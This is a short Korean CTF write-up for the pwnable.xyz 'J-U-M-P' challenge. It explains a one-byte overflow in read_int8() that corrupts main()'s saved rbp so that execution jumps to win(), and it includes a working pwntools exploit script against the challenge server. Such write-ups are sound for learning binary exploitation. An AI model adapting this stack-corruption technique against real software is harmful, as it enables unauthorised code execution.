# [pwnable.xyz] J-U-M-P

> Jump around

## The Bug

![image](https://github.com/user-attachments/assets/8846275b-daa8-4df5-9ff7-7d60a7a30fd4)

`read_int8()`에서 1바이트만큼 overflow가 발생한다. 이를 이용하여 `main()`의 `rbp`의 하위 1바이트를 임의의 값으로 조작할 수 있다.

![image](https://github.com/user-attachments/assets/0e356100-19d3-434a-bed6-d5101e954df4)

`read_int8()`의 return value는 `rbp+0x11`에 저장된다. `rbp`를 조작할 수 있기 때문에 결과적으로 `main()`의 스택 프레임에서 임의의 1바이트를 임의의 값으로 조작할 수 있다.

## Exploit

![image](https://github.com/user-attachments/assets/f4d08ea2-3616-4fb2-b741-78db1ad692d6)

원래 점프할 주소는 `main+22`인데, 마지막 1바이트를 `0x77`로 조작하면 `win()`으로 점프할 수 있다.

```python
from pwn import *

r = remote("svc.pwnable.xyz", 30012)

sla = r.sendlineafter
sa = r.sendafter

# get stack address
sla(b"> ", b"3")
rbp = int(r.recvline()[2:-1], 16) - 0xF8  # rbp of main()
log.info(f"rbp of main(): {hex(rbp)}")

# jump to win()
sa(b"> ", str(0x7B).ljust(0x20, "A").encode() + bytes([(rbp & 0xFF) + 0x9]))
sa(b"> ", str(1).ljust(0x20, "A").encode() + bytes([rbp & 0xFF]))

r.interactive()
```

![image](https://github.com/user-attachments/assets/85eb6177-47aa-4908-ab28-96614409568d)
